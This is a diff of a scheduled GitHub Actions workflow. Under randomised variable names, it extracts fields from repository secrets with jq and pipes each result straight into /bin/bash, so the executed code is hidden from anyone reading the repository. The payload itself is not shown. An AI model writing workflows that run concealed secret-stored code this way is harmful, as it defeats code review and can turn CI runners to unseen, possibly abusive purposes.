@@ -3,31 +3,20 @@ name: qudailiyu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 3/6 * * *'
-
+    - cron: '52 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qudailiyu
         env:
-          toy72985: ${{ secrets.toy72985 }}
+          dae58: ${{ secrets.dae58 }}
         run: |
-          echo $toy72985 | jq -r .vuygn1 | /bin/bash
-          echo $cav3532 | jq -r .e57556 | /bin/bash
-          echo $ts433 | jq -r .ynqw0 | /bin/bash
-          echo $agwvd5 | jq -r .ulf2 | /bin/bash
-          echo $q0993 | jq -r .sb8488 | /bin/bash
-          echo $qym14 | jq -r .idamd326 | /bin/bash
-          echo $np16 | jq -r .kjmqq6 | /bin/bash
-          echo $onw7816 | jq -r .us79168 | /bin/bash
-          echo $s32548 | jq -r .hwo9110 | /bin/bash
-          echo $pfuk2 | jq -r .o9618 | /bin/bash
-          echo $psmfj925 | jq -r .daq86 | /bin/bash
-          echo $urpk2 | jq -r .i374 | /bin/bash
-          echo $m4356 | jq -r .rtj2824 | /bin/bash
-          echo $te88 | jq -r .uxeks8 | /bin/bash
-          echo $g4121 | jq -r .yg084 | /bin/bash
+          echo $dae58 | jq -r .xw729 | /bin/bash
+          echo $m45174 | jq -r .eod06134 | /bin/bash
+          echo $kzocl28 | jq -r .bu597 | /bin/bash
+          echo $w1896 | jq -r .yfocq11470 | /bin/bash
+          echo $da8415 | jq -r .lt62 | /bin/bash
+          echo $wy562 | jq -r .b750 | /bin/bash
 
